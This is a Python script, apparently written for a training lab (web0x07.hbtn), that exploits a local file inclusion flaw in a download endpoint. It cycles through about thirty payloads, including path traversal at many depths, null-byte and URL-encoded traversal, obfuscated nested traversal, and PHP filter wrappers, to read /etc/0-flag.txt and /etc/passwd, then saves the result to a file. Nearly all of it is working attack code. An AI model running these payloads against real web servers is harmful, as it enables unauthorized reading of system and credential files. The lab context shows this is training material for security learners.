#!/usr/bin/env python3
"""
LFI Exploitation Script for web0x07.hbtn
Tests multiple payloads to retrieve /etc/0-flag.txt
"""

import requests
import sys
import os

# Base URL
BASE_URL = "http://web0x07.hbtn/task0/download_file"

# Target file
TARGET_FILE = "0-flag.txt"
TARGET_PATH = "/etc/0-flag.txt"

# Color codes for output
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

def test_payload(filename, path, description):
    """Test a single LFI payload"""
    params = {
        'filename': filename,
        'path': path
    }

    try:
        response = requests.get(BASE_URL, params=params, timeout=5)
        status = response.status_code

        if status == 200 and len(response.content) > 0:
            print(f"{GREEN}[SUCCESS]{RESET} {description}")
            print(f"  URL: {response.url}")
            print(f"  Status: {status}")
            print(f"  Content Length: {len(response.content)}")
            print(f"{GREEN}{'='*60}{RESET}")
            print(f"CONTENT:\n{response.text}")
            print(f"{GREEN}{'='*60}{RESET}")
            return response
        elif status == 304:
            print(f"{YELLOW}[304]{RESET} {description} - Not Modified (cached)")
            return None
        else:
            print(f"{RED}[{status}]{RESET} {description}")

    except Exception as e:
        print(f"{RED}[ERROR]{RESET} {description}: {e}")

    return None

def main():
    print(f"{YELLOW}Starting LFI Exploitation Script...{RESET}\n")

    # List of payloads to test
    payloads = [
        # Original working path
        ("README.md", ".", "Baseline test - README.md"),

        # Direct absolute path
        ("/etc/0-flag.txt", ".", "Absolute path in filename"),
        ("0-flag.txt", "/etc/", "Absolute path in path param"),
        ("0-flag.txt", "/etc", "Absolute path without trailing slash"),

        # Path traversal in filename
        ("../etc/0-flag.txt", ".", "One level traversal"),
        ("../../etc/0-flag.txt", ".", "Two levels traversal"),
        ("../../../etc/0-flag.txt", ".", "Three levels traversal"),
        ("../../../../etc/0-flag.txt", ".", "Four levels traversal"),
        ("../../../../../etc/0-flag.txt", ".", "Five levels traversal"),
        ("../../../../../../etc/0-flag.txt", ".", "Six levels traversal"),
        ("../../../../../../../etc/0-flag.txt", ".", "Seven levels traversal"),
        ("../../../../../../../../etc/0-flag.txt", ".", "Eight levels traversal"),

        # Path traversal in path parameter
        ("0-flag.txt", "../etc", "Traversal in path (1 level)"),
        ("0-flag.txt", "../../etc", "Traversal in path (2 levels)"),
        ("0-flag.txt", "../../../etc", "Traversal in path (3 levels)"),
        ("0-flag.txt", "../../../../etc", "Traversal in path (4 levels)"),
        ("0-flag.txt", "../../../../../etc", "Traversal in path (5 levels)"),

        # With trailing slashes
        ("0-flag.txt", "../../../etc/", "Path with trailing slash"),
        ("0-flag.txt", "../../../../etc////", "Multiple trailing slashes"),

        # Null byte injection
        ("../../../etc/0-flag.txt%00", ".", "Null byte in filename"),
        ("0-flag.txt%00", "../../../etc", "Null byte in filename (path in path)"),

        # Query string bypass
        ("../../../etc/0-flag.txt?", ".", "Query string bypass"),

        # PHP wrappers
        ("php://filter/convert.base64-encode/resource=/etc/0-flag.txt", ".", "PHP filter wrapper"),
        ("php://filter/convert.base64-encode/resource=../../../etc/0-flag.txt", ".", "PHP filter with traversal"),

        # Nested traversal
        ("....//....//....//etc/0-flag.txt", ".", "Nested traversal"),
        ("..././..././..././etc/0-flag.txt", ".", "Obfuscated traversal"),

        # URL encoding
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2f0-flag.txt", ".", "URL encoded traversal"),

        # Combined approaches
        ("./../../../../etc/0-flag.txt", ".", "Starting with ./"),

        # Test with /etc/passwd first to verify path traversal works
        ("../../../etc/passwd", ".", "Test with /etc/passwd (3 levels)"),
        ("../../../../etc/passwd", ".", "Test with /etc/passwd (4 levels)"),
        ("../../../../../etc/passwd", ".", "Test with /etc/passwd (5 levels)"),
    ]

    print(f"Testing {len(payloads)} different payloads...\n")

    success = False
    for filename, path, description in payloads:
        response = test_payload(filename, path, description)

        if response:
            # Check if this is the actual flag (not README.md)
            content = response.text

            # Skip if it's just the README
            if "README" in filename or "file hub" in content.lower():
                print(f"{YELLOW}  -> Skipping (README file, not the flag){RESET}\n")
                continue

            # If it contains "0-flag.txt" in filename or looks like a flag
            if "0-flag.txt" in filename or "passwd" in filename:
                success = True
                # Save in the same directory as the script
                script_dir = os.path.dirname(os.path.abspath(__file__))
                flag_file = os.path.join(script_dir, "0-flag.txt")

                with open(flag_file, 'w') as f:
                    f.write(content)

                print(f"\n{GREEN}Flag saved to: {flag_file}{RESET}")
                break

    if not success:
        print(f"\n{RED}No payload succeeded. The vulnerability might be patched or the file doesn't exist.{RESET}")
        print(f"{YELLOW}Try uploading a file first if there's an upload functionality.{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
